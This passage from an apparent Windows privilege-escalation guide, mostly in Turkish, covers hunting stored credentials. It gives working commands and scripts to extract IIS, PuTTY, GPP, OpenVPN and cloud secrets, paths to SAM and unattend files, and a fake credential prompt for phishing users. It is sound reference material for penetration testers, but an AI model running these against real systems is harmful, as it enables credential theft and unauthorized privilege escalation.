            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
Installer'lar **SYSTEM ayrıcalıklarıyla çalıştırılır** ve birçoğu **DLL Sideloading'e karşı savunmasızdır (Bilgi kaynağı:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dosyalar ve Kayıt Defteri (Kimlik Bilgileri)

### Destek araçlarının kayıt defterindeki kimlik bilgisi kalıntıları

Bazı eski uzaktan destek kurulumları, sabit uygulama kayıt defteri anahtarlarında parola ile ilgili değer adlarını tutar. Örneğin, [satıcının kayıt defteri anahtarı açıklamasına](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) göre TeamViewer'ın `SecurityPasswordAES` değeri, 9'dan önceki sürümlerde yapılandırılmış statik oturum parolasını tanımlıyordu. Bir değer adı işareti yalnızca inceleme için bir ipucudur: Bu kimlik bilgilerini değerlendirirken kurulu sürümü, okunabilir değer verisini, biçimi ve geçerli kimlik doğrulama davranışını doğrulayın. Uzaktan destek parolasından daha ayrıcalıklı bir Windows hesabına geçiş, ayrıca parolanın gerçekten yeniden kullanıldığının ve söz konusu hesap için yetkiniz olduğunun doğrulanmasını gerektirir. Şifreli verileri ve kurtarılan parolaları rutin envanter çıktısına eklemeyin.

### Korumalı sayfalar içeren paylaşılan elektronik tablolar

Okunabilir bir paylaşılan çalışma kitabının hesap verisi içerdiğinden şüpheleniliyorsa **dosya şifrelemesini**, çalışma sayfası korumasından veya gizli sütunlardan ayırt edin. [Microsoft'un belirttiği gibi](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), çalışma sayfası koruması düzenlemeyi denetler ve bir güvenlik özelliği değildir; tek başına çalışma kitabı içeriğinin şifrelendiğini göstermez. Yalnızca yetkili olduğunuz ve konuyla ilgili dosyaları inceleyin; geniş kapsamlı envanter çıkarırken olası sırları yazdırmaktan kaçının. Okunabilir bir `.xlsx` yolu, korumalı bir sayfa veya gizli bir sütun tek başına kimlik bilgilerinin bulunduğunu ya da herhangi bir hesabın daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz; gerçek verileri ve geçerli hesap haklarını ayrı ayrı doğrulayın.

### CI sunucusunda tutulan değişiklik yamaları

Bir CI sunucusu, derleme tamamlandıktan sonra bile gönderilen kaynak değişikliklerini veri dizininde tutabilir. [TeamCity,](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` dizinini uzaktan çalıştırma değişikliklerinin depolandığı yer olarak belgeliyor; veri dizini yapılandırılabilir ve `ProgramData` altında olmak zorunda değildir. Okunabilir bir yama; kimlik bilgisi dosyasına, şifreleme anahtarına veya ikisini kullanan bir betiğe ilişkin kaldırılmış ya da eklenmiş referansları koruyabilir. Örneğin, PowerShell'deki `ConvertTo-SecureString -Key` iş akışı hem AES anahtarını hem de şifrelenmiş metni gerektirir; [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) anahtarın ayrıca sağlandığını belgeliyor. Önce yalnızca erişilebilir yama adlarını inceleyin, ardından yetkiniz kapsamında ilgili içeriği sırları rutin envanter çıktısına eklemeden gözden geçirin. Bir yama yolu, şifrelenmiş değer veya anahtar referansı tek başına geçerli kimlik bilgilerini ya da daha yüksek ayrıcalıklı erişimi kanıtlamaz. Veri dizini ACL'lerini kısıtlayın ve derleme değişikliklerine sırları eklemekten kaçının.

### Özel yerel yönetici parolası döndürme

Kurum içinde geliştirilmiş bir parola döndürme aracı, şifrelenmiş bir yerel yönetici parolasını yerel hizmette tutarken veri deposu kimlik bilgilerini okunabilir bir `.env` dosyasında veya güncelleyici ikilisinin yanında saklayabilir. Güncelleyicinin zamanlanmış görevini, hesabını, yapılandırma ACL'lerini, dinleyicisini ve veri deposu izinlerini birlikte inceleyin. Yalnızca loopback arabirimine bağlı bir veri deposuna, geçerli kimlik bilgilerine sahip yerel kullanıcı yine de erişebilir; ancak kimlik doğrulaması tek başına ilgili kayıtları okuma iznini kanıtlamaz. Şifreleme tohumu veya anahtar materyali şifreli metnin yanında erişilebiliyorsa, şifrelemeye güvenmeden önce kullanılan kesin anahtar türetme yöntemini inceleyin. Açığa çıkmış bir tohumdan Go'nun [`math/rand`](https://pkg.go.dev/math/rand) paketiyle belirlenimci olarak AES anahtarı türeten bir yöntem, bu parolayı korumak için uygun değildir; Go, bu paketin güvenliğe duyarlı rastgelelik gerektiren kullanımlar için uygun olmadığını belgeliyor. Kurtarılan bir parolayı ayrıcalık yükseltme yolu olarak değerlendirmeden önce güncel olduğunu ve yerel Administrators grubu hesabına ait olduğunu doğrulayın. Zamanlanmış bir görev, `.env` yolu veya şifrelenmiş veri bloğu bu koşulların hiçbirini tek başına kanıtlamaz. Parolaları ve anahtar materyalini rutin envanter çıktısına eklemeyin.

Yönetilen yerel yönetici parolaları için [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kullanın. Dizin veya Entra tabanlı depolaması ve erişim denetimleri, özel bir yerel veri deposundan farklıdır; [Elasticsearch rolleri](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) de kimliği doğrulanmış bir veri deposu kullanıcısının belirli bir dizini okuyup okuyamayacağını belirler.

### Java sunucusu eklenti arşivleri ve kimlik bilgisi yeniden kullanımı

Bazı Java sunucusu eklentileri, sunucunun `plugins` dizininde JAR arşivleri olarak dağıtılır. Okunabilir bir özel eklenti, gömülü hizmet kimlik bilgisi içeren yapılandırma veya bayt kodu barındırabilir. Arşivi yalnızca yetkiniz varsa inceleyin ve kurtarılan sırları rutin envanter çıktısına eklemeyin. Bir eklenti yolu tek başına sır bulunduğunu kanıtlamaz; kurtarılan bir hizmet parolası da yalnızca daha ayrıcalıklı bir hesap için geçerliyse daha yüksek ayrıcalık sağlar. İlgili dosya ACL'lerini denetleyin ve yeniden kullanılan kimlik bilgilerini farklı sırlarla değiştirin. Dizin düzeni için [PaperMC'nin eklenti kurulum kılavuzuna](https://docs.papermc.io/paper/adding-plugins/), arşiv içerikleri için [Oracle'ın JAR belgelerine](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) bakın.

### Openfire gömülü veri tabanı kimlik bilgileri

Gömülü veri tabanını kullanan bir Openfire kurulumu, `openfire.script` dosyasını `Openfire\embedded-db` altında tutabilir. Geçerli hesap bu dosyayı okuyabiliyorsa `OFUSER` kayıtlarını ve `passwordKey` özelliğini birlikte inceleyin. Openfire'ın [kullanıcı sağlayıcısı belgelerine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) göre parolalar düz metin olarak veya bu özellikte tutulan bir anahtarla şifrelenmiş biçimde saklanabilir. Kurtarılan bir parola, yalnızca daha ayrıcalıklı bir kimlik için hâlâ geçerliyse ayrıcalık yükseltme açısından önem taşır; dosya adı tek başına ne dosyaya okuma erişimini ne de kimlik bilgisi yeniden kullanımını kanıtlar. Bu yol bir envanter ipucudur; veri tabanı içeriğini ve kimlik bilgilerini rutin envanter çıktısına eklemeyin.

Ayrı olan `Openfire\conf\openfire.xml` dosyası, harici bir veri tabanı kullanılsa bile yönetici konsolunun yapılandırılmış portlarını ve bağlanma arabirimini gösterebilir. Openfire genellikle yönetici konsolunu loopback'e bağlar; dinleyici çalışıyorsa yerel bir hesap bu adrese yine de erişebilir. Gerçek dinleyiciyi, yetkili yönetici rolünü, eklenti yükleme ilkesini ve Openfire hizmet kimliğini birlikte denetleyin. Eklenti yükleyebilen bir yönetici, eklenti kodunu hizmetin bağlamında çalıştırabilir; hizmet LocalSystem olarak çalışıyorsa bu yüksek ayrıcalıklara sahip olabilir. Eşleşen bir hesap parolası veya okunabilir bir yapılandırma yolu tek başına yönetici konsoluna erişimi ya da kod yürütmeyi kanıtlamaz. Satıcının [kurulum ve eklenti yönetimi kılavuzuna](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) ve [eklenti yükleme API özelliğine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) bakın.

### Adli bilişim yönetim sunucusu yapılandırması

Genellikle `server.config.yaml` adını taşıyan Velociraptor sunucusu yapılandırmaları, dahili CA'nın `CA.private_key` değerini içerebilir. Daha düşük ayrıcalıklı bir kullanıcı bu anahtarı okuyabiliyorsa bir API istemci sertifikası oluşturabilir. Bunun daha yüksek ayrıcalıklara yol açıp açmayacağı sunucunun kullanıcı rollerine, API'ye erişilebilirliğe ve sunucunun ya da hedef aracının çalıştığı kimliğe bağlıdır. İstemci yapılandırması farklı materyaller içerir; böyle bir yapılandırmanın bulunması sunucu CA'sına erişimi kanıtlamaz. Bazı kurulumlarda CA özel anahtarı çevrimdışı tutulur; bu nedenle okunabilir bir sunucu yapılandırmasında imzalama anahtarı bulunmayabilir.

Windows sunucusunda, kurulum dizinindeki **sunucu** yapılandırmasının ve korumalı yedeklerinin ACL'sini inceleyin. Olası konumlardan biri `%ProgramFiles%\VelociraptorServer\server.config.yaml` şeklindedir; farklı bir yol kullanılıyorsa hizmet için yapılandırılmış yolu kullanın. Geçerli kimliğin dosyayı okuyabildiğini ve `CA.private_key` değerinin gerçekten mevcut olduğunu doğrulayın. Özel anahtarı günlüklerde veya envanter çıktısında yazdırmaktan kaçının. Satıcının `config api_client` iş akışı, istemci sertifikası oluşturmak için CA anahtarını kullanır; ancak etkin bir sunucu tarafı rolü de gerekir. Böyle bir rol oluşturmak veya değiştirmek veri deposuna yazma erişimi ya da yeniden başlatma gerektirebilir. Bu yazma işlemleri mümkün olmasa bile mevcut ayrıcalıklı bir sunucu kimliği bir yol sağlayabilir. Yürütme haklarına sahip API sorguları, ilgili sunucu veya aracı bağlamında çalışır ve bu bağlam yüksek ayrıcalıklara sahip olabilir.

Sunucu yapılandırmasını ve yedeklerini kısıtlayıcı ACL'lerle koruyun, mümkünse CA imzalama anahtarını çevrimdışı tutun ve API rollerini ve dinleyici erişimini sınırlayın. [Velociraptor API belgelerine](https://docs.velociraptor.app/docs/server_automation/server_api/) ve [güvenlik yapılandırması kılavuzuna](https://docs.velociraptor.app/docs/deployment/security/) bakın.

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ayrı bir oturum yöneticisidir. Yerel şifrelenmiş veri deposu `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` konumunda olabilir; dışa aktarılmış oturum yedeği ise `sessions-backup.dat` olarak adlandırılabilir ve başka bir yerde saklanabilir. [SolarWinds'in dışa aktarma kılavuzuna](https://thwack.solarwinds.com/discussion/comment/115591) göre dışa aktarımlar parola ile şifrelenir ve oturumları, anahtarları, script'leri, etiketleri ve ilişkileri içerebilir; [destek forumunda](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) yerel veri deposunun konumu belirtilmiştir. Önce dosya izinlerini ve yolları kontrol edin. Bu dosyalardan birini bulmak, parolasını açığa çıkarmaz veya kayıtlı kimlik bilgilerinin hâlâ geçerli olduğunu ya da daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz.

### PuTTY SSH Host Anahtarları

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Registry'deki SSH anahtarları

SSH private key'leri `HKCU\Software\OpenSSH\Agent\Keys` registry key'i içinde saklanabilir; bu yüzden burada ilginç bir şey olup olmadığını kontrol etmelisiniz:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Bu yolun içinde herhangi bir girdi bulursanız, bu muhtemelen kayıtlı bir SSH key'dir. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` service çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız, şunu çalıştırın:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Görünüşe göre bu teknik artık geçerli değil. Birkaç SSH anahtarı oluşturup bunları `ssh-add` ile eklemeyi ve SSH üzerinden bir makinede oturum açmayı denedim. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri anahtarı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Gözetimsiz dosyalar

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM yedekleri

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Okunabilir Windows Imaging (`.wim`) yedek dosyaları çevrimdışı `SAM`, `SECURITY` ve `SYSTEM` hive'larını da içerebilir. Yerel olarak erişilebilen yedekleme veya imaj dizinlerine öncelik verin ve herhangi bir şeyi çıkarmadan önce imajın **üye adlarını** inceleyin; yalnızca `.wim` dosya adı, hive'ların bulunduğunu kanıtlamaz ve standart `install.wim`, `boot.wim` ve kurtarma imajları sık karşılaşılan yanlış ipuçlarıdır. SMB share ayrı bir erişim yoludur ve yalnızca kapsam dahilindeyse kontrol edilmelidir. Microsoft'un [Windows imajı kılavuzuna](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) ve [registry hive dosyası başvurusuna](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) bakın.

### Bulut Kimlik Bilgileri

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** adlı bir dosya arayın.

### Önbelleğe Alınmış GPP Parolası

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir grup makineye özel yerel yönetici hesaplarının dağıtılmasını sağlayan bir özellik vardı. Ancak bu yöntemin önemli güvenlik açıkları bulunuyordu. İlk olarak, SYSVOL'de XML dosyaları olarak depolanan Group Policy Objects (GPO'lar) tüm etki alanı kullanıcıları tarafından erişilebilirdi. İkinci olarak, herkese açık şekilde belgelenmiş varsayılan bir anahtarla AES256 kullanılarak şifrelenen bu GPP'lerdeki parolalar, kimliği doğrulanmış herhangi bir kullanıcı tarafından çözülebilirdi. Bu durum, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine yol açabileceğinden ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, boş olmayan bir "cpassword" alanı içeren önbelleğe alınmış yerel GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulduğunda işlev parolanın şifresini çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP ve dosyanın konumu hakkındaki ayrıntıları içererek bu güvenlik açığının belirlenmesine ve giderilmesine yardımcı olur.

Bu dosyaları `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ konumlarında arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ın şifresini çözmek için:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Parolaları almak için crackmapexec kullanımı:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Kimlik bilgileri içeren web.config örneği:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot içindeki yedek arşivleri

Doğrudan sunulan bir webroot içine yerleştirilmiş eski bir ZIP yedeği, önceki yapılandırma dosyalarını ve yeniden kullanılabilir kimlik bilgilerini açığa çıkarabilir. Bunu bir ifşa olarak değerlendirmeden önce sitenin yapılandırılmış fiziksel yolunu ve arşive HTTP üzerinden gerçekten erişilip erişilemediğini kontrol edin. Varsayılan `C:\inetpub\wwwroot` yolu yalnızca olası bir konumdur. Hızlı bir yerel envanter, arşivleri açmadan adları ve boyutları listeleyebilir:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Bir arşivin adı, içinde gizli bilgi bulunduğunu veya kurtarılan bir kimlik bilgisinin daha yüksek ayrıcalık sağladığını kanıtlamaz.

### OpenVPN kimlik bilgileri

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Günlükler

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Kimlik bilgilerini isteyin

Kullanıcının bunları bilebileceğini düşünüyorsanız, **kullanıcıdan kendi kimlik bilgilerini, hatta başka bir kullanıcının kimlik bilgilerini girmesini her zaman isteyebilirsiniz** (istemciden doğrudan **kimlik bilgilerini** **istemek** gerçekten **risklidir**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Kimlik bilgileri içerebilecek dosya adları**

Geçmişte **parolaları** **açık metin** veya **Base64** biçiminde içeren bilinen dosyalar

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Password Safe uzantısı olmayan dosya adı listesi varyantı

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 veritabanıları genellikle `.psafe3` uzantısını kullanır. Eşleşen bir dosya adını şifrelenmiş kasa adayı olarak değerlendirin; dosyanın varlığı, onu okuyabildiğinizi, kilidini açabildiğinizi veya içinde saklanan kimlik bilgilerini kullanabildiğinizi göstermez. Bu dosyaların nerede saklandığını incelerken erişilebilir kullanıcı profillerini ve yapılandırılmış dosya paylaşım köklerini kontrol edin.

Okunabilir bir KeePass `.kdbx` dosyası da yalnızca şifrelenmiş kasa için bir ipucudur. Kilidini açmak için gerçek ana parola ve yapılandırılmış tüm anahtar dosyası ya da hesap faktörleri gerekir. Yetkili bir incelemede bir girdide LM:NT hash çifti bulunursa, [pass-the-hash](../ntlm/README.md#pass-the-hash) seçeneğini değerlendirmeden önce adı geçen hesabı ve NT hash'inin geçerli olup olmadığını ve hedefin NTLM hizmeti tarafından kabul edilip edilmediğini doğrulayın. Bir kasa girdisi tek başına Administrator veya SYSTEM hakları sağlamaz; uzaktan hizmet erişimi, hesap hakları ve ayrı bir hizmet çalıştırma adımı da geçerli olmalıdır. Envanterde veritabanını veya saklanan kimlik bilgilerini yazdırmak yerine kasanın yolunu ve okunabilirliğini bildirin.

Önerilen tüm dosyaları arayın:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Password Safe eklentisi olmadan Search komutu varyantı

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Geri Dönüşüm Kutusu'ndaki Kimlik Bilgileri

Kimlik bilgilerini bulmak için Geri Dönüşüm Kutusu'nu da kontrol etmelisiniz.

Silinmiş yedekleri ve yapılandırma arşivlerini, ayrıca adında açıkça kimlik bilgilerinden söz eden dosyaları bulmak için erişilebilir Geri Dönüşüm Kutusu girdilerini kontrol edin. Yararlı bir `.7z`, `.zip` veya `.rar` yedeği aylar öncesine ait olabilir ve sıradan bir dosya adına sahip olabilir. Windows, özgün yolu ve silinme zamanını bir `$I` kaydında, silinmiş dosyayı ise bunun eşleşen `$R` girdisinde saklar; bir arşivi açmadan önce metadata'yı ve mevcut kullanıcının okuma erişimini inceleyin. Görünürlük birime, kullanıcı SID'sine ve dosya izinlerine bağlıdır; bu nedenle boş bir liste, kurtarılabilir yedek bulunmadığını kanıtlamaz. Arşiv adını, geçerli bir sır içerdiğinin kanıtı olarak değil, incelenmesi gereken bir aday olarak değerlendirin.

